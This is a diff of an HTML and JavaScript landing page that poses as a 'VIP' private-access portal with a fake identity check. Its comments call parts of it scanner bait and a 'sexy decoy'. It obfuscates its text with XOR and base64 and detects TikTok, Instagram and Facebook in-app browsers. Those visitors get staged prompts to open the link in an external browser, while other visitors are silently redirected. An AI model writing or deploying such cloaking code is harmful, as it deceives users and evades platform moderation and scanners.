@@ -4,48 +4,67 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="robots" content="noindex, nofollow">
-    <title>Verificación de Seguridad</title>
+    <title>VIP Access | Private Portal</title>
     <style id="_s_main">
-        body { margin:0; background:#000; color:#fff; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow:hidden; }
-        ._r { display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; text-align:center; background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); transition: background 0.5s ease; }
+        :root { --p: #ff006e; --s: #3a0ca3; --b: #050505; --w: #ffffff; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { margin:0; background: var(--b); color: var(--w); font-family: 'Inter', -apple-system, sans-serif; height: 100vh; overflow:hidden; position: relative; }
         
-        /* State 1: Portal */
-        ._p_card { max-width:400px; width:100%; border-radius:28px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); padding:40px 20px; box-shadow:0 20px 50px rgba(0,0,0,0.5); animation: _in 0.6s ease-out; }
-        ._p_icon { width:60px; height:60px; margin:0 auto 25px; background:#ff006e; border-radius:18px; display:flex; align-items:center; justify-content:center; box-shadow:0 10px 20px rgba(255,0,110,0.3); }
-        ._p_h { font-size:1.6rem; font-weight:700; margin-bottom:12px; letter-spacing:-0.02em; }
-        ._p_t { font-size:0.95rem; opacity:0.6; line-height:1.6; margin-bottom:30px; }
-        ._p_btn { width:100%; padding:16px; border:none; border-radius:14px; background:#ff006e; color:#fff; font-weight:700; font-size:1rem; cursor:pointer; transition: transform 0.2s, background 0.2s; box-shadow:0 8px 15px rgba(255,0,110,0.2); }
-        ._p_btn:active { transform: scale(0.98); background:#e60063; }
+        /* Ambient Mesh Background */
+        ._bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; background: #000; }
+        ._orb { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.4; animation: _move 20s infinite alternate; }
+        ._o1 { width: 300px; height: 300px; background: var(--p); top: -50px; right: -50px; }
+        ._o2 { width: 400px; height: 400px; background: var(--s); bottom: -100px; left: -100px; animation-delay: -5s; }
+        @keyframes _move { from { transform: translate(0,0) scale(1); } to { transform: translate(10%, 15%) scale(1.2); } }
 
-        /* State 2: Bridge */
-        ._b_card { display:none; max-width:380px; width:100%; background:rgba(255,255,255,0.05); padding:30px 20px; border-radius:24px; border:1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 40px rgba(0,0,0,0.5); text-align:left; animation: _in 0.5s ease-out; }
-        ._b_h { font-size:1.8em; font-weight:bold; margin-bottom:10px; color:#ff006e; text-align:center; text-transform:uppercase; letter-spacing:1px; }
-        ._b_sub { font-size:1em; margin-bottom:25px; opacity:0.8; text-align:center; line-height:1.5; }
-        ._step { display:flex; gap:12px; margin-bottom:15px; align-items:center; font-size:0.95em; }
-        ._n { background:#ff006e; min-width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:0.8em; }
-        ._gi { width:100%; border-radius:12px; margin-top:15px; border:1px solid rgba(255,255,255,0.1); }
+        ._r { display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; text-align:center; }
+        
+        /* Glassmorphism Card */
+        ._card { max-width:400px; width:100%; border-radius:32px; background: rgba(255,255,255,0.03); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); padding:40px 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); animation: _fadeUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1); position:relative; }
+        
+        ._logo { font-size:1.2rem; font-weight:800; color: var(--p); margin-bottom:30px; letter-spacing:0.1em; text-transform: uppercase; display:flex; align-items:center; justify-content:center; gap:8px; }
+        ._h { font-size:1.6rem; font-weight:700; margin-bottom:12px; letter-spacing: -0.02em; }
+        ._t { font-size:0.95rem; color: rgba(255,255,255,0.6); line-height:1.6; margin-bottom:35px; }
+        
+        /* Premium Button */
+        ._btn { width:100%; padding:20px; border:none; border-radius:18px; background: var(--p); color:#fff; font-weight:700; font-size:1rem; cursor:pointer; transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1); box-shadow: 0 10px 30px rgba(255,0,110,0.3); letter-spacing: 0.05em; position: relative; overflow: hidden; }
+        ._btn:active { transform: scale(0.96); }
+        ._btn::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent); transform: rotate(45deg); animation: _shine 3s infinite; }
+        @keyframes _shine { from { left: -150%; } to { left: 150%; } }
 
-        /* General */
-        @keyframes _in { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+        ._step { display:flex; gap:15px; margin-bottom:20px; align-items:center; font-size:0.95em; text-align:left; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
+        ._n { background: var(--p); min-width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:0.85em; color:#fff; box-shadow: 0 0 15px rgba(255,0,110,0.4); }
+        ._gi { width:100%; border-radius:20px; margin-top:10px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+
+        @keyframes _fadeUp { from { opacity:0; transform:translateY(30px) scale(0.95); } to { opacity:1; transform:translateY(0) scale(1); } }
         @keyframes _rot { to { transform:rotate(360deg); } }
+        ._scan { position: relative; margin: 0 auto 30px; width: 60px; height: 60px; border: 2px solid rgba(255,0,110,0.3); border-radius: 50%; }
+        ._scan::after { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; border: 2px solid transparent; border-top-color: var(--p); border-radius: 50%; animation: _rot 0.8s linear infinite; }
     </style>
 </head>
 <body>
+    <div class="_bg">
+        <div class="_orb _o1"></div>
+        <div class="_orb _o2"></div>
+    </div>
+
     <div id="_main_root" class="_r">
-        <!-- Bait for Scanners (Portal) -->
-        <div id="_portal" class="_p_card">
-            <div class="_p_icon">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <!-- Stage 1: Sexy Decoy -->
+        <div id="_portal" class="_card">
+            <div class="_logo">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+                PRO-IDENTITY
             </div>
-            <div class="_p_h" id="_ph_text">Access Portal</div>
-            <div class="_p_t" id="_pt_text">Verify your device to continue to the private content. This is a secure verification process.</div>
-            <button class="_p_btn" id="_p_action">VERIFY ACCESS</button>
+            <div class="_h" id="_ph_text"></div>
+            <div class="_t" id="_pt_text"></div>
+            <button class="_btn" id="_p_action"></button>
+            <div style="margin-top:25px; font-size:0.7rem; color:rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 0.2em;">Encrypted VIP Session</div>
         </div>
 
-        <!-- Hidden Bridge (Only revealed after click) -->
-        <div id="_bridge" class="_b_card">
-            <div class="_b_h" id="_bh_text"></div>
-            <div class="_b_sub" id="_bs_text"></div>
+        <!-- Stage 2: Bridge (Seductive Steps) -->
+        <div id="_bridge" class="_card" style="display:none;">
+            <div class="_h" id="_bh_text" style="color: var(--p); margin-bottom: 5px;"></div>
+            <div class="_t" id="_bs_text" style="margin-bottom: 25px;"></div>
             <div class="_step">
                 <div class="_n">1</div>
                 <div id="_s1_text"></div>
@@ -56,56 +75,76 @@
             </div>
             <img id="_bridge_img" class="_gi" style="display:none;">
         </div>
+
+        <!-- Stage 3: Success Transition -->
+        <div id="_final" class="_card" style="display:none;">
+            <div style="width:70px; height:70px; background: linear-gradient(135deg, #4ade80, #22c55e); border-radius:50%; margin:0 auto 25px; display:flex; align-items:center; justify-content:center; color:#fff; box-shadow: 0 10px 30px rgba(34,197,94,0.4);">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="_h" id="_fh_text" style="margin-bottom: 10px;"></div>
+            <div class="_t" id="_ft_text"></div>
+            <button class="_btn" id="_f_action" style="background: var(--p);"></button>
+            <div style="margin-top:25px; font-size:0.75rem; color:#4ade80; font-weight:700; text-transform: uppercase;">Verified Identity</div>
+        </div>
     </div>
 
     <script id="_logic">
         (function() {
-            const d = (s) => decodeURIComponent(atob(s).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
-
+            const K = "LPRO2026";
+            const d = (s) => {
+                const b = atob(s);
+                return b.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ K.charCodeAt(i % K.length))).join('');
+            };
+            const ua = navigator.userAgent.toLowerCase();
+            const isSocial = /tiktok|instagram|fb_iab|threads|fban|fbav|musically|musical_ly/.test(ua);
+            
             const data = {
-                ph: 'QUNDRVNPIFByaXZhZG8=', 
-                pt: 'UGFyYSBjb250aW51YXIsIGRlYmVtb3MgdmVyaWZpY2FyIHF1ZSBlcmVzIHVuIHVzdWFyaW8gcmVhbCB5IG5vIHVuIHJvYm90LiBQb3IgZmF2b3IgcHVsc2EgZWwgYm90w7NuIGRlIGFiYWpvLg==', 
-                pb: 'VkVSSUZJQ0FSIEFDQ0VTTw==', 
-                bh: 'QUNDRVNPIFZJUA==', 
-                bs: 'RXN0w6FzIGEgdW4gcGFzbyBkZSBlbnRyYXIuIEZpbmFsaXphIGxhIHZlcmlmaWNhY2nDs24gcGFyYSBjb250aW51YXIu',
-                s1: 'VG9jYSBsb3MgMyBwdW50b3MgKOKLkikgZW4gbGEgZXNxdWluYSBzdXBlcmlvci4=', 
-                s2: 'U2VsZWNjaW9uYSAiQWJyaXIgZW4gbmF2ZWdhZG9yIiBwYXJhIGNvbnRpbnVhci4=', 
-                img: '/images/gitonly.png'
+                ph: 'HD8gO1NcElIpcBMsUVVBWWwAICZEUVZZ',
+                pt: 'CSMmwq5BEFMWPCU8O10QVlNsNTw7QFFAFi1wJyFTEFdOPDUgJldeUV8tcDc3UVxHRSUmM2ESZldEJTY7LFNTW8OFInA8KlFVQVc+OTNvQlFAV2wxMSxXQ10WGhkCYQ==',
+                pb: 'CR4GHXNiEncAcBoacBBiZAUGEwt9',
+                bh: 'DxEBBhJ8e2UYH3xhHA==',
+                bs: 'Hzk1OlcQV0U4PyFvQlFBWT9wIMKuQllWWT9wIi5AURJSKSMwI11BR1MtInIqXhBTVS81ISASRF1CLTx8',
+                s1: 'GD8xLhJcXUVsY3I/R15GWT9weuKKoRsQV1hsPDNvV0NDQyU+M29BRUJTPjk9PRw=',
+                s2: 'HzU+KlFTW1kiMXJtc1JAXz5wNyESXlNAKTczK11CEBY8MSAuElNdWDg5PDpTQhw=',
+                fh: 'DTMxKkFfEnUjPjEqVllWWQ==',
+                ft: 'Djk3IURVXF8oMXIuElxTFjY/PC4SQEBTITknIhwQZkNsMz0hV0hbw4UicDc8EkNXUTkiM29LEEJEJSYzK1Me',
+                fb: 'CBUBDX5/Y2MJEQBvYnVgcAUc'
             };
 
-            document.getElementById('_ph_text').textContent = d(data.ph);
-            document.getElementById('_pt_text').textContent = d(data.pt);
-            document.getElementById('_p_action').textContent = d(data.pb);
+            const portal = document.getElementById('_portal');
+            const bridge = document.getElementById('_bridge');
+            const final = document.getElementById('_final');
+
+            if (!isSocial) {
+                portal.style.display = 'none';
+                final.style.display = 'block';
+                document.getElementById('_fh_text').textContent = d(data.fh);
+                document.getElementById('_ft_text').textContent = d(data.ft);
+                document.getElementById('_f_action').textContent = d(data.fb);
+                document.getElementById('_f_action').onclick = () => window.location.href = window.location.pathname + '?jump=true';
+            } else {
+                document.getElementById('_ph_text').textContent = d(data.ph);
+                document.getElementById('_pt_text').textContent = d(data.pt);
+                document.getElementById('_p_action').textContent = d(data.pb);
+            }
 
             document.getElementById('_p_action').addEventListener('click', function() {
-                const portal = document.getElementById('_portal');
-                const bridge = document.getElementById('_bridge');
-                const root = document.getElementById('_main_root');
-
-                portal.innerHTML = `
-                    <div style="width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top-color:#ff006e; border-radius:50%; animation:_rot 1s linear infinite; margin:0 auto 20px;"></div>
-                    <div style="font-size:1.1rem; opacity:0.8;">Verificando navegador...</div>
-                `;
-                
+                portal.innerHTML = `<div class="_scan"></div><div style="font-weight:700; letter-spacing:0.1em; color:var(--p);">AUTENTICANDO...</div>`;
                 setTimeout(() => {
                     portal.style.opacity = '0';
-                    portal.style.transform = 'scale(0.9)';
-                    
+                    portal.style.transform = 'translateY(-20px) scale(0.9)';
                     setTimeout(() => {
                         portal.style.display = 'none';
-                        root.style.background = 'radial-gradient(circle at center, #2e001e 0%, #000 100%)';
-                        
                         document.getElementById('_bh_text').textContent = d(data.bh);
                         document.getElementById('_bs_text').textContent = d(data.bs);
                         document.getElementById('_s1_text').textContent = d(data.s1);
                         document.getElementById('_s2_text').textContent = d(data.s2);
                         const bImg = document.getElementById('_bridge_img');
-                        bImg.src = data.img;
+                        bImg.src = '/images/gitonly.png';
                         bImg.style.display = 'block';
-
                         bridge.style.display = 'block';
-                    }, 300);
-                }, 1000);
+                    }, 400);
+                }, 1200);
             });
         })();
     </script>
